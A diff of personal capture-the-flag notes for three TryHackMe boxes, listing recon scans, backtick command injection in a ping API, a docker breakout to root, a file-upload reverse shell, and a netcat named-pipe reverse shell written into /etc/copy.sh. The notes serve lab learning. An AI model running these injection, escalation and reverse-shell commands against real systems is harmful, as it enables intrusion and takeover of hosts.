@@ -10,30 +10,31 @@
 <h2>Current boxes done in this manner:</h2>
 
 </br> 1) UltraTech (tryHackMe)
-- sudo nmap -sS -T4 -A -p- <ip.addr> -oN scanOutput.txt
-- gobuster dir -u http://<ip.adr>:<port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-- wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hw <wordcount-to-exclude>  http://10.10.61.189:31331/FUZZ
+- <b>sudo nmap -sS -T4 -A -p- <ip.addr> -oN scanOutput.txt</b>
+- <b>gobuster dir -u http://<ip.adr>:<port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</b>
+</br> (directory searching assumes you have the directory-list in the path /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)
+- <b>wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hw <wordcount-to-exclude>  http://10.10.61.189:31331/FUZZ </b>
 - vuln API in a js file found. --> [ const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}` ]
-- backticks allow us to run a command with higher priority! --></br> API 
-<ip.target>:<port>/ping?ip=`ls`
+- backticks allow us to run a command with higher priority! -->
+</br> <b> <ip.target>:<port>/ping?ip=`ls`</b>
 - show contents of a discovered sql database
-http://10.10.61.189:8081/ping?ip=`cat utech.db.sqlite`
-- Serve up file shuffle to get LinEnum on target --> Python -m SimpleHTTPServer 8080.
+<b> http://10.10.61.189:8081/ping?ip=`cat utech.db.sqlite` </b>
+- Serve up file shuffle to get LinEnum on target --> <b> Python -m SimpleHTTPServer 8080.</b>
 (note tha port 8080 has to be used if 80 is busy)
 - Make sure LinEnum is transferred to target via wget (similar to curl)
-wget http://<ip.attacker>:8080/LinEnum.sh
-—> chmod +x LinEnum.sh
-- docker found, so GTFO bin helps us break out --> docker run -v /:/mnt --rm -it bash chroot /mnt sh
+<b> wget http://<ip.attacker>:8080/LinEnum.sh </b>
+—> <b>chmod +x LinEnum.sh</b>
+- <b> docker found </b>, so GTFO bin helps us break out --> <b> docker run -v /:/mnt --rm -it bash chroot /mnt sh</b>
 
 </br> 2) Lazy Admin (tryHackMe)
 - sweetrice data exposure : url variation of  [ http://localhost/inc/mysql_backup ] 
 </br> webfiles at [http://localhost/SweetRice-transfer.zip]
-- file upload vector in "media center" for sweetrice
+- file upload vector in "media center" for sweetrice's admin panel
 - use php reverse shell and set up netcat to catch the shell https://github.com/pentestmonkey/php-reverse-shell
-- sudo -l (finds) backup.pl (which calls) /etc/copy.sh (which runs a reverse shell of its own out to some ip, presumably for serving backup data)
-- overwrite copy.sh file via CLI --> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.253.178 5554 >/tmp/f" > /etc/copy.sh
+-  <b>sudo -l  </b>,(finds) backup.pl (which calls) /etc/copy.sh (which runs a reverse shell of its own out to some ip, presumably for serving backup data)
+- overwrite copy.sh file via CLI -->  <b>,echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.253.178 5554 >/tmp/f" > /etc/copy.sh </b>,
 
-</br> Anonymous(v6) (tryHackMe)
+</br> 3) Anonymous(v6) (tryHackMe)
 - Ftp anonymous login
 </br> ftp <ip>
 </br> username: anonymous
